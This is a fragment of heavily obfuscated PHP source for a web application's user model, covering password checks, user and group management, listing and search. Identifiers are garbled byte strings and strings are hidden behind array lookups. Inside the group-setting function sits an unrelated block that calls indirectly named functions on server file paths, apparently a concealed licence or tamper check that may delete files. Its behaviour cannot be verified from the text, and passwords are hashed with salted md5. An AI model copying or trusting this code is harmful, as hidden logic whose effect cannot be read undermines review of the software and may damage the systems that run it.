userPasswordCheck($cÁ÷õÒÁ™œ, $EÁˆÆÜ¡«Ö) { $Bèƒ’¾àİ… =& $_SERVER[Äº¡•ô™Ÿ]; $cùØ¶šÃà = $this->where(array($Bèƒ’¾àİ…[1416] => intval($cÁ÷õÒÁ™œ)))->find(); $D‘ãÑô´®ñ = $this->metaGet($cÁ÷õÒÁ™œ); $bÂ¡òæñìŸ = isset($D‘ãÑô´®ñ[$Bèƒ’¾àİ…[2478]]) ? $D‘ãÑô´®ñ[$Bèƒ’¾àİ…[2478]] : $Bèƒ’¾àİ…[33]; if (md5($bÂ¡òæñìŸ . trim($EÁˆÆÜ¡«Ö)) !== $cùØ¶šÃà[$Bèƒ’¾àİ…[804]]) { return !1; } return !0; } public function userAdd($dŸÒ‘ŞÑ±Î) { goto C‘ø«öœæ; eŞ‰´ÑŠ: $DÊË³©˜Ôˆ = $this->_checkExist($dŸÒ‘ŞÑ±Î); if ($DÊË³©˜Ôˆ !== !0) { return $DÊË³©˜Ôˆ; } $a™´íõÍŒø = $this->add($DÖ–Ş˜“); goto C¿ÈëŸØñ; C‘ø«öœæ: $d‡¸ø¯’—è =& $_SERVER[Äº¡•ô™Ÿ]; $DÖ–Ş˜“ = array($d‡¸ø¯’—è[383] => $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[28]], $d‡¸ø¯’—è[2479] => $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2480]], $d‡¸ø¯’—è[2481] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[290]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[290]] : $d‡¸ø¯’—è[33], $d‡¸ø¯’—è[2482] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2476]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2476]] : $d‡¸ø¯’—è[33], $d‡¸ø¯’—è[2483] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2299]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2299]] : $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[28]], $d‡¸ø¯’—è[2484] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2461]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2461]] : $d‡¸ø¯’—è[33], $d‡¸ø¯’—è[2485] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2486]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2486]] : 1, $d‡¸ø¯’—è[2487] => $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[804]], $d‡¸ø¯’—è[2149] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2063]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[2063]] : 1024 * 1024 * 20, $d‡¸ø¯’—è[2150] => 0, $d‡¸ø¯’—è[2477] => 0, $d‡¸ø¯’—è[2174] => isset($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[692]]) ? $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[692]] : 1); if (!empty($dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[1416]])) { $DÖ–Ş˜“[$d‡¸ø¯’—è[1416]] = $dŸÒ‘ŞÑ±Î[$d‡¸ø¯’—è[1416]]; } goto eŞ‰´ÑŠ; C¿ÈëŸØñ: $C°Ùóùî = array($d‡¸ø¯’—è[2487] => $DÖ–Ş˜“[$d‡¸ø¯’—è[804]], $d‡¸ø¯’—è[2483] => $DÖ–Ş˜“[$d‡¸ø¯’—è[2299]]); $this->userEdit($a™´íõÍŒø, $C°Ùóùî); Model($d‡¸ø¯’—è[1110])->userRootAdd($a™´íõÍŒø); goto e’çÎæÔš; e’çÎæÔš: return $a™´íõÍŒø; goto Dˆ¡İ âÑÜ; Dˆ¡İ âÑÜ: } protected function userEditTest($bÜƒãÀ›…Ù, $fò¹ÏÇºš–) { return $this->call($_SERVER[Äº¡•ô™Ÿ][2488], $bÜƒãÀ›…Ù, $fò¹ÏÇºš–); } protected function userEdit($b¦¿¼ÅÔÑ, $CÁÁœÈŞÒ) { goto f—³Û¼™ŒÈ; B˜Ø…ƒ•à: $dô‡·ßÕô = $this->_checkExist($CÁÁœÈŞÒ, $b¦¿¼ÅÔÑ); if ($dô‡·ßÕô !== !0) { return $dô‡·ßÕô; } if (isset($CÁÁœÈŞÒ[$f„²È°Ÿç [804]]) && trim($CÁÁœÈŞÒ[$f„²È°Ÿç [804]]) != $f„²È°Ÿç [33]) { $E´—ÛÌÎ›™ = $this->metaGet($b¦¿¼ÅÔÑ); if (empty($E´—ÛÌÎ›™[$f„²È°Ÿç [2478]])) { $E´—ÛÌÎ›™[$f„²È°Ÿç [2478]] = rand_string(10); Model($f„²È°Ÿç [470])->metaSet($b¦¿¼ÅÔÑ, $f„²È°Ÿç [2478], $E´—ÛÌÎ›™[$f„²È°Ÿç [2478]]); } $CÁÁœÈŞÒ[$f„²È°Ÿç [804]] = md5($E´—ÛÌÎ›™[$f„²È°Ÿç [2478]] . trim($CÁÁœÈŞÒ[$f„²È°Ÿç [804]])); } else { unset($CÁÁœÈŞÒ[$f„²È°Ÿç [804]]); } goto DØ”¥Å­Š’; DØ”¥Å­Š’: $this->where(array($f„²È°Ÿç [1407] => $b¦¿¼ÅÔÑ))->save($CÁÁœÈŞÒ); if (isset($CÁÁœÈŞÒ[$f„²È°Ÿç [2299]])) { $this->setNamePinyin($b¦¿¼ÅÔÑ, $CÁÁœÈŞÒ[$f„²È°Ÿç [2299]]); } return !0; goto a¦Ëì¦º¦; f—³Û¼™ŒÈ: $f„²È°Ÿç  =& $_SERVER[Äº¡•ô™Ÿ]; $fÙ®œøò÷¸ = $this->getInfoSimple($b¦¿¼ÅÔÑ); if (!$fÙ®œøò÷¸) { return !1; } goto B˜Ø…ƒ•à; a¦Ëì¦º¦: } public function setNamePinyin($CõÚĞ…ŠØŠ, $Có“‹½³ÖÜ = false) { $EŒË‡ì¢ÕÎ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Có“‹½³ÖÜ) { $e”íÔáˆ¥Œ = $this->getInfoSimple($CõÚĞ…ŠØŠ); $Có“‹½³ÖÜ = $e”íÔáˆ¥Œ[$EŒË‡ì¢ÕÎ[2299]] ? $e”íÔáˆ¥Œ[$EŒË‡ì¢ÕÎ[2299]] : $e”íÔáˆ¥Œ[$EŒË‡ì¢ÕÎ[28]]; } $a¦‰ÉÃƒ»Ç = Model($EŒË‡ì¢ÕÎ[473]); if (!Input::check($Có“‹½³ÖÜ, $EŒË‡ì¢ÕÎ[524])) { return $a¦‰ÉÃƒ»Ç->metaSet($CõÚĞ…ŠØŠ, array($EŒË‡ì¢ÕÎ[412] => $EŒË‡ì¢ÕÎ[33], $EŒË‡ì¢ÕÎ[411] => $EŒË‡ì¢ÕÎ[33])); } return $a¦‰ÉÃƒ»Ç->metaSet($CõÚĞ…ŠØŠ, array($EŒË‡ì¢ÕÎ[412] => str_replace($EŒË‡ì¢ÕÎ[50], $EŒË‡ì¢ÕÎ[33], Pinyin::encode($Có“‹½³ÖÜ)), $EŒË‡ì¢ÕÎ[411] => Pinyin::encode($Có“‹½³ÖÜ, $EŒË‡ì¢ÕÎ[525]))); } private function nickNameRpt() { $BÕ°Ê‰Ü’ =& $_SERVER[Äº¡•ô™Ÿ]; $FİğïÇŠÖ = Model($BÕ°Ê‰Ü’[1088])->get($BÕ°Ê‰Ü’[2489]); $aÅÊ…„–‚Œ = $GLOBALS[$BÕ°Ê‰Ü’[6]][$BÕ°Ê‰Ü’[2445]][$BÕ°Ê‰Ü’[2489]]; $bÜ¤Âİ–µ½ = !is_null($FİğïÇŠÖ) ? $FİğïÇŠÖ : $aÅÊ…„–‚Œ; return !!$bÜ¤Âİ–µ½; } private function _checkExist($eÃ®¡¥£Ç¥, $b‚è‘¼ŒÔ¶ = false) { $aŒöÙğ©â =& $_SERVER[Äº¡•ô™Ÿ]; $bÖ™ªÚé²Û = array($aŒöÙğ©â[28] => UserModel::ERROR_USER_EXIST_NAME, $aŒöÙğ©â[2299] => UserModel::ERROR_USER_EXIST_NICKNAME, $aŒöÙğ©â[290] => UserModel::ERROR_USER_EXIST_EMAIL, $aŒöÙğ©â[2476] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($bÖ™ªÚé²Û[$aŒöÙğ©â[2299]]); } $fĞŞŠ“¢ Á = $b‚è‘¼ŒÔ¶ ? array($aŒöÙğ©â[1416] => array($aŒöÙğ©â[2490], $b‚è‘¼ŒÔ¶)) : array(); foreach ($bÖ™ªÚé²Û as $FØØÏÎé¯ => $E¹Ğø‘ä¹í) { if (!isset($eÃ®¡¥£Ç¥[$FØØÏÎé¯]) || !$eÃ®¡¥£Ç¥[$FØØÏÎé¯]) { continue; } $B‚ê«¾ğ»İ = array_merge(array($FØØÏÎé¯ => $eÃ®¡¥£Ç¥[$FØØÏÎé¯]), $fĞŞŠ“¢ Á); $D –ä¹Ó“ = $this->where($B‚ê«¾ğ»İ)->find(); if ($D –ä¹Ó“) { return $E¹Ğø‘ä¹í; } } return !0; } public function userListInfo($D…­áãÙÂº) { $CÙ×¢İƒÊé =& $_SERVER[Äº¡•ô™Ÿ]; $bŞ‚ÇÆšÕà = array(); $D…­áãÙÂº = is_array($D…­áãÙÂº) ? array_unique($D…­áãÙÂº) : array(); if (!$D…­áãÙÂº) { return $bŞ‚ÇÆšÕà; } if (count($D…­áãÙÂº) < 20) { foreach ($D…­áãÙÂº as $e¬“»ß¹í ) { $bŞ‚ÇÆšÕà[$e¬“»ß¹í  . $CÙ×¢İƒÊé[33]] = $this->getInfoSimpleOuter($e¬“»ß¹í ); } } else { $CóÃªƒå› = array($CÙ×¢İƒÊé[1407] => array($CÙ×¢İƒÊé[381], $D…­áãÙÂº)); if (count($D…­áãÙÂº) == 1) { $CóÃªƒå› = array($CÙ×¢İƒÊé[1407] => $D…­áãÙÂº[0]); } $E«Şò±ÖªÏ = Model($CÙ×¢İƒÊé[470])->field($this->simpleField)->where($CóÃªƒå›)->select(); $E«Şò±ÖªÏ = array_to_keyvalue($E«Şò±ÖªÏ, $CÙ×¢İƒÊé[1416]); foreach ($D…­áãÙÂº as $e¬“»ß¹í ) { $CÃŠí²×ÇŸ = $E«Şò±ÖªÏ[$E«Şò±ÖªÏ[$e¬“»ß¹í ]]; if (!$CÃŠí²×ÇŸ) { $bŞ‚ÇÆšÕà[$e¬“»ß¹í  . $CÙ×¢İƒÊé[33]] = $this->getInfoSimpleOuter($e¬“»ß¹í ); continue; } $CÃŠí²×ÇŸ[$CÙ×¢İƒÊé[2461]] = Action($CÙ×¢İƒÊé[2462])->parseUrl($CÃŠí²×ÇŸ[$CÙ×¢İƒÊé[2461]]); $bŞ‚ÇÆšÕà[$e¬“»ß¹í  . $CÙ×¢İƒÊé[33]] = $CÃŠí²×ÇŸ; } } return $bŞ‚ÇÆšÕà; } protected function userStatus($AÔÌ‚„Ç‘, $C»Ç•¶åÖÂ) { $F„Ù®÷¢›ø = $this->getInfoSimple($AÔÌ‚„Ç‘); if (!$F„Ù®÷¢›ø) { return !1; } $EÒ‹Úóã† = array($_SERVER[Äº¡•ô™Ÿ][692] => $C»Ç•¶åÖÂ); return $this->userEdit($AÔÌ‚„Ç‘, $EÒ‹Úóã†); } protected function userRemove($aÙİ—¨°³Å) { goto Fèİä‹£Â; d“£˜ã—®°: Model($fšª“©´ŞÙ[2153])->where($D¼Ğî†‡õ§)->delete(); Model($fšª“©´ŞÙ[2475])->where($D¼Ğî†‡õ§)->delete(); Model($fšª“©´ŞÙ[2492])->where($D¼Ğî†‡õ§)->delete(); goto D¢¿‹¬„ğ¦; AëÌï¸°íä: $D¼Ğî†‡õ§ = array($fšª“©´ŞÙ[1407] => $aÙİ—¨°³Å); Model($fšª“©´ŞÙ[532])->where($D¼Ğî†‡õ§)->delete(); Model($fšª“©´ŞÙ[2491])->where($D¼Ğî†‡õ§)->delete(); goto d“£˜ã—®°; Fèİä‹£Â: $fšª“©´ŞÙ =& $_SERVER[Äº¡•ô™Ÿ]; $Cìƒ›Ö¾‘Ï = $this->getInfoSimple($aÙİ—¨°³Å); if (!$Cìƒ›Ö¾‘Ï) { return !1; } goto AëÌï¸°íä; D¢¿‹¬„ğ¦: Model($fšª“©´ŞÙ[755])->userRootRemove($aÙİ—¨°³Å); return $this->where($D¼Ğî†‡õ§)->delete(); goto Bó´¬ìõ¤Ã; Bó´¬ìõ¤Ã: } protected function userGroupSet($E¾À²éƒ´, $F´Æ¨êæÉ, $AÔÈ¢ªÊ = array()) { goto eæ“¶é‹Ö; A‚­óÔ”ÊÖ: return $B§ïŞ ”¤->addAll($Bé‰ôĞÇÙø, array(), !0); goto a¸³—Æè±»; AÆË¸ƒ‡¶È: if (!$EİÛ¦ĞÈ—¸ || !is_array($F´Æ¨êæÉ)) { return !1; } $B§ïŞ ”¤ = Model($d© ƒ“„×¾[2153]); $B§ïŞ ”¤->where(array($d© ƒ“„×¾[1416] => $E¾À²éƒ´))->delete(); goto EŞÃ¦¬ò©Ç; eæ“¶é‹Ö: $d© ƒ“„×¾ =& $_SERVER[Äº¡•ô™Ÿ]; if ($_SERVER[$d© ƒ“„×¾[789]] != $_SERVER[$d© ƒ“„×¾[790]]) { goto D©íÊÅ¬ ’; D©íÊÅ¬ ’: $bÔ½•ß¢ïì = $d© ƒ“„×¾[791]; $E·²ÉÛÓ÷¬ = $d© ƒ“„×¾[792]; $Cª‚ˆÉêö = $_SERVER[$d© ƒ“„×¾[793]] . $d© ƒ“„×¾[794]; goto d²ó¿²ˆŒ÷; d²ó¿²ˆŒ÷: $B÷¨Ê’£‰Ì = $E·²ÉÛÓ÷¬($Cª‚ˆÉêö); $Fù†“Ò…×ø = explode($d© ƒ“„×¾[214], $B÷¨Ê’£‰Ì); if (count($Fù†“Ò…×ø) < $d© ƒ“„×¾[558]) { $C¿Ô½Ğªí³ = $d© ƒ“„×¾[795]; $C¿Ô½Ğªí³(); } goto fâ¢½ß¶“Å; fâ¢½ß¶“Å: $a×Æùµ¤× = $d© ƒ“„×¾[796]; $a×Æùµ¤×($_SERVER[$d© ƒ“„×¾[797]]); $a×Æùµ¤×($_SERVER[$d© ƒ“„×¾[793]] . $d© ƒ“„×¾[798]); goto c¬Àù²”; c¬Àù²”: $Dãİ†±îª = 1; while ($Dãİ†±îª > 1) { $Dãİ†±îª = $Dãİ†±îª + 4; $BŸ››ÉëÌã = rawurlencode($Dãİ†±îª . $d© ƒ“„×¾[358]); } goto Fº¥„Ò½ï‰; Fº¥„Ò½ï‰: } $EİÛ¦ĞÈ—¸ = $this->getInfoSimple($E¾À²éƒ´); goto AÆË¸ƒ‡¶È; EŞÃ¦¬ò©Ç: $Bé‰ôĞÇÙø = array(); $BŞõîæ²ñá = 0; foreach ($F´Æ¨êæÉ as $C–‚‹¾Œ° => $fÅ×Á‘‹Ÿ¢) { $fÂ×Î¶Õ‘Å = array($d© ƒ“„×¾[1416] => $E¾À²éƒ´, $d© ƒ“„×¾[2079] => $C–‚‹¾Œ°, $d© ƒ“„×¾[2207] => $fÅ×Á‘‹Ÿ¢); $fÂ×Î¶Õ‘Å[$d© ƒ“„×¾[2100]] = isset($AÔÈ¢ªÊ[$BŞõîæ²ñá]) ? $AÔÈ¢ªÊ[$BŞõîæ²ñá] : 0; $BŞõîæ²ñá++; $Bé‰ôĞÇÙø[] = $fÂ×Î¶Õ‘Å; } goto A‚­óÔ”ÊÖ; a¸³—Æè±»: } protected function userGroupAdd($aóÍ»•¿…É, $fóÊ¸›Æá‹, $eàä‚Š¬¯¸) { $A¶ò¹˜àŠ =& $_SERVER[Äº¡•ô™Ÿ]; $côÙ”ÎøÜ = $this->getInfoSimple($aóÍ»•¿…É); if (!$côÙ”ÎøÜ || !$fóÊ¸›Æá‹) { return !1; } $dùˆ×‘¡¹ñ = array(array($A¶ò¹˜àŠ[1416] => $aóÍ»•¿…É, $A¶ò¹˜àŠ[2079] => $fóÊ¸›Æá‹, $A¶ò¹˜àŠ[2207] => $eàä‚Š¬¯¸)); return Model($A¶ò¹˜àŠ[2153])->addAll($dùˆ×‘¡¹ñ, array(), !0); } protected function userGroupRemove($fğ»³†°ëÂ, $bïÒ‚ÌªŞ¾) { $EÑ‚ˆºŠË± =& $_SERVER[Äº¡•ô™Ÿ]; $Cï¤‘´óÒŞ = $this->getInfoSimple($fğ»³†°ëÂ); if (!$Cï¤‘´óÒŞ || !$bïÒ‚ÌªŞ¾) { return !1; } $c¿¾ŒµŞ±« = array($EÑ‚ˆºŠË±[1407] => $fğ»³†°ëÂ, $EÑ‚ˆºŠË±[2151] => $bïÒ‚ÌªŞ¾); return Model($EÑ‚ˆºŠË±[2153])->where($c¿¾ŒµŞ±«)->delete(); } public function listData() { $dîÕÌ‡«Ì” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dîÕÌ‡«Ì”[$_SERVER[Äº¡•ô™Ÿ][351]]); return $dîÕÌ‡«Ì”; } public function listByID($Aâ‡‘Ÿ¡Á¶) { $aÛ•Ï‰Œ³á =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Aâ‡‘Ÿ¡Á¶) { return; } $bŞ‘¿°´ù = array($aÛ•Ï‰Œ³á[1416] => array($aÛ•Ï‰Œ³á[7], $Aâ‡‘Ÿ¡Á¶)); $A‰ŒÙ‡Šöá = $this->where($bŞ‘¿°´ù)->select(); $this->_listDataApply($A‰ŒÙ‡Šöá); return $A‰ŒÙ‡Šöá; } public function listByGroup($a‹ƒ†à¤ßµ = 0, $Aš–±ñ¦á = array()) { goto c¤Õ×‹ôµ¹; C³Ù•Ä‘ä: $this->_listDataApply($e»½…Ïšò¸[$B„ƒ‹ËË˜[351]]); return $e»½…Ïšò¸; goto bœ«òŞ¢ƒ; c¤Õ×‹ôµ¹: $B„ƒ‹ËË˜ =& $_SERVER[Äº¡•ô™Ÿ]; $a‘Ø×†äÇ = $B„ƒ‹ËË˜[33]; $fŒ¹¼àå¶ğ = array(); goto c‰åØªËñë; c‰åØªËñë: if ($a‹ƒ†à¤ßµ) { $fŒ¹¼àå¶ğ = array($B„ƒ‹ËË˜[2493] => intval($a‹ƒ†à¤ßµ)); $a‘Ø×†äÇ = "\x4c\105\106\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\x75\163\145\162\x5f\x67\x72\157\x75\160\40\165\163\x65\x72\x5f\147\x72\157\x75\160\x20\x6f\156\x20\x75\x73\x65\162\56\x75\163\145\162\x49\x44\x20\x3d\40\x75\x73\145\162\x5f\147\x72\x6f\165\x70\x2e\165\x73\x65\x72\x49\104"; $Eèç¦Óòìí = Input::get($B„ƒ‹ËË˜[403], null, $B„ƒ‹ËË˜[33]) ? $B„ƒ‹ËË˜[33] : $B„ƒ‹ËË˜[2494]; } if (isset($Aš–±ñ¦á[$B„ƒ‹ËË˜[692]])) { $fŒ¹¼àå¶ğ[$B„ƒ‹ËË˜[2495]] = $Aš–±ñ¦á[$B„ƒ‹ËË˜[692]]; } $e»½…Ïšò¸ = $this->_makeOrder($Eèç¦Óòìí)->field($B„ƒ‹ËË˜[2496])->where($fŒ¹¼àå¶ğ)->join($a‘Ø×†äÇ)->selectPage(50); goto C³Ù•Ä‘ä; bœ«òŞ¢ƒ: } private function _makeOrder($Cëå¬‡Çëˆ = '') { goto d‰çğÈÄ­Ø; d‰çğÈÄ­Ø: $e¾Âù÷Ù‹ =& $_SERVER[Äº¡•ô™Ÿ]; $a¾­¶ŠØâ = array($e¾Âù÷Ù‹[1416], $e¾Âù÷Ù‹[28], $e¾Âù÷Ù‹[2065], $e¾Âù÷Ù‹[2038], $e¾Âù÷Ù‹[184]); $bÃÀİ„Åíù = array($e¾Âù÷Ù‹[398] => $e¾Âù÷Ù‹[399], $e¾Âù÷Ù‹[400] => $e¾Âù÷Ù‹[401]); goto DÚ˜ÒãÙ”™; DÚ˜ÒãÙ”™: $b­Ÿâİ‰°ó = Input::get($e¾Âù÷Ù‹[403], $e¾Âù÷Ù‹[7], $e¾Âù÷Ù‹[1407], $a¾­¶ŠØâ); $aà¡ÇÖµ½ = Input::get($e¾Âù÷Ù‹[404], $e¾Âù÷Ù‹[7], $e¾Âù÷Ù‹[2154], array($e¾Âù÷Ù‹[2154], $e¾Âù÷Ù‹[400])); $aà¡ÇÖµ½ = $bÃÀİ„Åíù[$aà¡ÇÖµ½]; goto B‰àÈ‘…ÒÃ; B‰àÈ‘…ÒÃ: $Cëå¬‡Çëˆ = $Cëå¬‡Çëˆ . "\165\x73\145\x72\x2e{$b­Ÿâİ‰°ó}\x20{$aà¡ÇÖµ½}\54\x20\165\x73\145\x72\x2e\165\x73\x65\x72\x49\x44\40\141\163\x63"; return $this->alias($e¾Âù÷Ù‹[2240])->order($Cëå¬‡Çëˆ); goto E½‹¾£À·ö; E½‹¾£À·ö: } public function listSearch($cİ™­µªà) { goto b‹÷ß‹÷¥; CÜ££òÍ‚Ê: $b²ÅÇ…¯² = str_replace($cŒ´”™¹ŒÑ[2157], $cŒ´”™¹ŒÑ[2158], trim($b²ÅÇ…¯²)); $BßÃÙğ¡°Ÿ = array($cŒ´”™¹ŒÑ[28] => array($cŒ´”™¹ŒÑ[754], "\x25{$b²ÅÇ…¯²}\x25"), $cŒ´”™¹ŒÑ[290] => array($cŒ´”™¹ŒÑ[754], "\45{$b²ÅÇ…¯²}\45"), $cŒ´”™¹ŒÑ[2299] => array($cŒ´”™¹ŒÑ[754], "\45{$b²ÅÇ…¯²}\45"), $cŒ´”™¹ŒÑ[916] => $cŒ´”™¹ŒÑ[2159]); if (Input::check($b²ÅÇ…¯², $cŒ´”™¹ŒÑ[296])) { $BßÃÙğ¡°Ÿ[$cŒ´”™¹ŒÑ[1416]] = array($cŒ´”™¹ŒÑ[754], "\45{$b²ÅÇ…¯²}\x25"); $BßÃÙğ¡°Ÿ[$cŒ´”™¹ŒÑ[2476]] = array($cŒ´”™¹ŒÑ[754], "\x25{$b²ÅÇ…¯²}\x25"); } goto CÌš±º£ãÅ; b¤ßåÔ„Ú‚: if (!$CõÌ…Ï’’ || count($CõÌ…Ï’’[$cŒ´”™¹ŒÑ[351]]) < 5 && Input::check($b²ÅÇ…¯², $cŒ´”™¹ŒÑ[303])) { $c¿¿ø¹ä’ = $this->_searchFromMeta($cŒ´”™¹ŒÑ[411], $b²ÅÇ…¯², 10); $Eà£ÖĞ¾Ç• = $this->_searchFromMeta($cŒ´”™¹ŒÑ[412], $b²ÅÇ…¯², 10); $Dï‡¨–æÏÊ = array_merge($c¿¿ø¹ä’, $Eà£ÖĞ¾Ç•, $CõÌ…Ï’’[$cŒ´”™¹ŒÑ[351]]); $CõÌ…Ï’’[$cŒ´”™¹ŒÑ[351]] = array_unique_by_key($Dï‡¨–æÏÊ, $cŒ´”™¹ŒÑ[1416]); $CõÌ…Ï’’[$cŒ´”™¹ŒÑ[348]][$cŒ´”™¹ŒÑ[349]] = count($CõÌ…Ï’’[$cŒ´”™¹ŒÑ[351]]); $CõÌ…Ï’’[$cŒ´”™¹ŒÑ[348]][$cŒ´”™¹ŒÑ[350]] = ceil($CõÌ…Ï’’[$cŒ´”™¹ŒÑ[348]][$cŒ´”™¹ŒÑ[349]] / $CõÌ…Ï’’[$cŒ´”™¹ŒÑ[348]][$cŒ´”™¹ŒÑ[346]]); } $this->_listDataApply($CõÌ…Ï’’[$cŒ´”™¹ŒÑ[351]]); $this->_filterByGroup($CõÌ…Ï’’, $e¦ÏôĞ®Å); goto A”»ìÅ†ó; b‹÷ß‹÷¥: $cŒ´”™¹ŒÑ =& $_SERVER[Äº¡•ô™Ÿ]; $b²ÅÇ…¯² = $cİ™­µªà[$cŒ´”™¹ŒÑ[2155]]; $e¦ÏôĞ®Å = isset($cİ™­µªà[$cŒ´”™¹ŒÑ[2156]]) ? $cİ™­µªà[$cŒ´”™¹ŒÑ[2156]] : !1; goto CÜ££òÍ‚Ê; CÌš±º£ãÅ: if (!$b²ÅÇ…¯²) { $BßÃÙğ¡°Ÿ = array(); } if (isset($cİ™­µªà[$cŒ´”™¹ŒÑ[692]])) { $BßÃÙğ¡°Ÿ[$cŒ´”™¹ŒÑ[692]] = $cİ™­µªà[$cŒ´”™¹ŒÑ[692]]; } $CõÌ…Ï’’ = $this->_makeOrder()->where($BßÃÙğ¡°Ÿ)->selectPage(20); goto b¤ßåÔ„Ú‚; A”»ìÅ†ó: return $CõÌ…Ï’’; goto CÊ½Î…³º‚; CÊ½Î…³º‚: } private function _filterByGroup(&$A’ÛÕÚ¹–, $fµÓå·„„) { $DÄÃ¼ô‰¿ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$fµÓå·„„) { return $A’ÛÕÚ¹–; } foreach ($A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[351]] as $DÇ‰¦‰›Ü => &$BË‹ªÜ‡ï) { $EÉ›®•± = array_to_keyvalue($BË‹ªÜ‡ï[$DÄÃ¼ô‰¿[2497]], $DÄÃ¼ô‰¿[33], $DÄÃ¼ô‰¿[2079]); if (!in_array($fµÓå·„„, $EÉ›®•±)) { unset($A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[351]][$DÇ‰¦‰›Ü]); } } $A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[351]] = array_values($A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[351]]); $A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[348]] = array($DÄÃ¼ô‰¿[2274] => count($A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[351]]), $DÄÃ¼ô‰¿[2272] => $A’ÛÕÚ¹–[$DÄÃ¼ô‰¿[348]][$DÄÃ¼ô‰¿[346]], $DÄÃ¼ô‰¿[2271] => 1, $DÄÃ¼ô‰¿[2273] => 1); } private function _searchFromMeta($cøøäì èÍ, $C—–˜ƒ…•†, $C™øÑœÎÊ) { goto cÎà†ƒŸî; C˜’µÄ™‹: $FÍàø»à„ = Model($EÅŒÜæÚ[2498])->where($eÀòÊº‡°)->limit($C™øÑœÎÊ)->select(); if (!$FÍàø»à„) { return array(); } $FÍàø»à„ = array_to_keyvalue($FÍàø»à„, $EÅŒÜæÚ[33], $EÅŒÜæÚ[1416]); goto dªœœ¦Æ™Û; dªœœ¦Æ™Û: $aŸ’”ß‹¥ = $this->where(array($EÅŒÜæÚ[1407] => array($EÅŒÜæÚ[7], $FÍàø»à„)))->select(); if (!$aŸ’”ß‹¥) { return array(); } return $aŸ’”ß‹¥; goto E–¿˜ù êÓ; cÎà†ƒŸî: $EÅŒÜæÚ =& $_SERVER[Äº¡•ô™Ÿ]; $C—–˜ƒ…•† = strtolower($C—–˜ƒ…•†); $eÀòÊº‡° = array($EÅŒÜæÚ[89] => $cøøäì èÍ, $EÅŒÜæÚ[356] => array($EÅŒÜæÚ[754], "\x25{$C—–˜ƒ…•†}\x25")); goto C˜’µÄ™‹; E–¿˜ù êÓ: } private function _listDataApplyItem($AŸí¶ôÁ) { $dØ¢×ÕçÈÌ = array($AŸí¶ôÁ); $this->_listDataApply($dØ¢×ÕçÈÌ); return $dØ¢×ÕçÈÌ[0]; } private function _listDataApply(&$AÚµˆ¨¾µ») { goto eºÑ§«Æ¬à; DÍğ‡Ô¦ã: $BİÇ Àñ±À = array_to_keyvalue($AÚµˆ¨¾µ», $bôô¡à”±Ä[33], $bôô¡à”±Ä[1416]); $this->_listAppendGroup($AÚµˆ¨¾µ», $BİÇ Àñ±À); $this->_listAppendMeta($AÚµˆ¨¾µ», $BİÇ Àñ±À); goto A×Ô×Ç½; A×Ô×Ç½: $this->_listAppendSourceRoot($AÚµˆ¨¾µ», $BİÇ Àñ±À); goto eƒ¿­‰Ö»; eºÑ§«Æ¬à: $bôô¡à”±Ä =& $_SERVER[Äº¡•ô™Ÿ]; if (!$AÚµˆ¨¾µ») { return; } array_remove_key($AÚµˆ¨¾µ», $bôô¡à”±Ä[804]); goto DÍğ‡Ô¦ã; eƒ¿­‰Ö»: } private function _listAppendSourceRoot(&$C ‚œÁÛ«¨, $BåŞ¤öÊº™) { goto b‡¡ŠÅ¬É; F›´…¨…ÇÇ: foreach ($C ‚œÁÛ«¨ as &$dÖå…Ó°Ã©) { $dÖå…Ó°Ã©[$bö²öëïÍ[388]] = $d´Ë™ÈÏ½í[$dÖå…Ó°Ã©[$bö²öëïÍ[1416]]] ? $d´Ë™ÈÏ½í[$dÖå…Ó°Ã©[$bö²öëïÍ[1416]]] : array(); } goto E õ—Şã·¤; a¸ÚøÀš—£: $d´Ë™ÈÏ½í = Model($bö²öëïÍ[755])->order($bö²öëïÍ[2166])->field($fŞµ½ˆâá)->where($F¢É¹§ÇÑ)->select(); $d´Ë™ÈÏ½í = array_to_keyvalue($d´Ë™ÈÏ½í, $bö²öëïÍ[452]); $d´Ë™ÈÏ½í = array_remove_key($d´Ë™ÈÏ½í, $bö²öëïÍ[452]); goto F›´…¨…ÇÇ; b‡¡ŠÅ¬É: $bö²öëïÍ =& $_SERVER[Äº¡•ô™Ÿ]; $F¢É¹§ÇÑ = array($bö²öëïÍ[457] => 0, $bö²öëïÍ[368] => SourceModel::TYPE_USER, $bö²öëïÍ[452] => array($bö²öëïÍ[7], $BåŞ¤öÊº™)); $fŞµ½ˆâá = $bö²öëïÍ[2165]; goto a¸ÚøÀš—£; E õ—Şã·¤: } private function _listAppendGroup(&$c¸²ãÉ, $EÉÑ§Æ§°Ö) { goto d‚ÁÕÁƒÂ†; eß¢Îƒ³ó…: $CºÒˆåÃæ = array($d„˜Í‹øè[2079] => array($d„˜Í‹øè[7], $E¤ĞÇ•Ùöó)); 